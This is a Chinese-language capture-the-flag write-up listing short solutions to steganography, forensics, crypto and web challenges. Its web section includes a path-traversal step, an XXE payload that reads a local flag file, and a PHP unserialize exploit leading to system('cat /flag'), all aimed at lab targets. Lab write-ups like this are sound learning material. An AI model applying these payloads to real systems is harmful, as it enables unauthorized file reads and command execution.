# CTF WP (ZUENS2020)


## 安全杂项
- Misc入门指北 ✅
    - 附件PDF中的隐藏字段
- ez_LSB ✅
    - 使用StegSolve
    ![StegSolve]
- SSTV ✅
    ![SSTV]
- 掐住一只耳 ✅
    - 使用Audacity可以发现左声道的摩斯电码
    ![moss]
- Enchantment ✅
    - 使用tshark从enchantment.pcapng中找出图片-AI
    ![SGA]
    - 解开SGA银河字母[https://www.dcode.fr/standard-galactic-alphabet]
- ez_png ✅
    - 理解 PNG 文件结构:    -AI
       PNG 格式由一连串 chunk（数据块）组成，每个 chunk 包括：
      | 4字节长度 | 4字节块类型 | 数据区 | 4字节CRC |
      常见的块类型：
        IHDR：文件头信息（宽度、高度、颜色类型等）
        IDAT：图像压缩数据，可有多个
        IEND：文件尾标识
    - 使用工具查看chunk[https://www.nayuki.io/page/png-file-chunk-inspector]
    - 发现可疑块
    ![chunk]
    - 解码899 007部分 -AI
    ![Zlib]

## 从此开始
- 签到 ✅

## 二进制漏洞审计
- 0 二进制漏洞审计入门指北 ✅
- 1 ez_u64 ✅
- 2 EZtext
- fmt
- randomlock
- str_check
- syslock
- easylibc
- fmt_S

## 密码学
- Crypto入门指北 ✅
- ez_DES ✅
- baby_next ✅
- ez_square ✅
- ezlegendre ✅

## 逆向工程
- 逆向工程入门指北
- upx
- ez3
- flower
- A cup of tea
- mazegame

## Web安全与渗透测试
- 0 Web入门指北 ✅
    - 把附件中的代码复制到控制台中获得flag 
- 01 第一章 神秘的手镯 ✅
    - 查看页面源代码发现
    ```
    <script src="shouzhuo.js"></script>
    ```
    - 打开shouzhuo.js发现
    ```
    <div class="flag">moectf{f_i2_1s_Your_g00d_fri3nd!!}</div>
    ```
    - 得到flag
- 02 第二章 初识金曜玄轨 ✅
    - 通过Wireshark分析
    - 在对/golden_trail的http包进行分析后发现
    ```
    /golden_trail/flag
    ```
    - 得到flag
- 03 第三章 向剑石！算天攻击! ✅
    - 使用burpsuit修改测试请求
    ```
    POST /test_talent?level=S HTTP/1.1
    Host: 127.0.0.1:11055
    Content-Length: 24
    Content-Type: application/json
    Accept: */*
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: keep-alive
    Origin: http://127.0.0.1:11055
    Referer: http://127.0.0.1:11055/
    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Sec-Ch-Ua-Platform: "Windows"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36

    {"manifestation":"flowing_azure_clouds"}
    ```
    - 得到flag
- 05 第五章 打上门来! ✅
    - （本题有后面题目的提示）
    - 使用../访问文件目录    ------询问AI
    - 阅读index.php了解逻辑
    ```
    <!-- 上级目录链接 -->
    <?php if ($target !== './' && $target !== '/' && $target !== ''): ?>
        <tr>
            <td class="folder-cell" onclick="navigateTo(
                '<?php echo dirname($target) === '.' ? './' : dirname($target); ?>'
            )">
                <i class="fas fa-level-up-alt"></i> ..
            </td>
            <td>上级信标库</td>
        </tr>
    <?php endif; ?>

    <!-- 实际文件系统中的内容 -->
    <?php
    $entries = scandir($now_target);
    foreach ($entries as $entry):
        if ($entry === '.' || $entry === '..') continue;
        $fullPath = rtrim($target, '/') . '/' . $entry;
        $judgePath = rtrim($now_target, '/') . '/' . $entry;
        if (is_dir($judgePath)):
    ```
    - 尝试使用../../进入根目录，得到flag
- Moe笑传之猜猜爆 ✅
- 04 第四章 金曜极禁与七绝伶俐阵
- 06 第六章 藏经禁地？玄机初探!
- 07 第七章 灵媒妖穴与阴阳双生符
- 08 第八章 天行真言，星图显圣
- 10 第十章 天机符阵 ✅
    - 输入内容发现报错信息特点，使用题目已知元素
    ```xml
    <?xml version="1.0"?> 
    <!DOCTYPE 阵枢 [ 
        <!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
    ]>
    <阵枢>
        &lt;解析>&xxe;&lt;/解析>
    </阵枢>
    ```
    - 尝试使用 <阵枢> 作为根元素，<解析> 作为包含实体引用的子元素。-----AI
- 19 第十九章 星穹真相·补天归源 ✅
    - 观察页面发现题目是一段PHP代码
    - 发现核心漏洞：unserialize($_GET['person']) ----AI
    - 漏洞可以执行用户输入的内容
    - 在 PersonC::__Check() 方法中，绕过 flag 检查，并利用其中的 $name($age) 最终执行 system('cat /flag') ----AI



[StegSolve]:https://cdn.luogu.com.cn/upload/image_hosting/edtwi6vn.png?x-oss-process=image/resize,m_lfit,h_170,w_225

[SSTV]:https://cdn.luogu.com.cn/upload/image_hosting/u4kcc7iv.png

[moss]:https://cdn.luogu.com.cn/upload/image_hosting/2k7ni7yn.png?x-oss-process=image/resize,m_lfit,h_170,w_225

[SGA]:https://cdn.luogu.com.cn/upload/image_hosting/082kb65a.png?x-oss-process=image/resize,m_lfit,h_170,w_225

[chunk]:https://cdn.luogu.com.cn/upload/image_hosting/bw3glndu.png?x-oss-process=image/resize,m_lfit,h_170,w_225

[Zlib]:https://cdn.luogu.com.cn/upload/image_hosting/s1by0js1.png
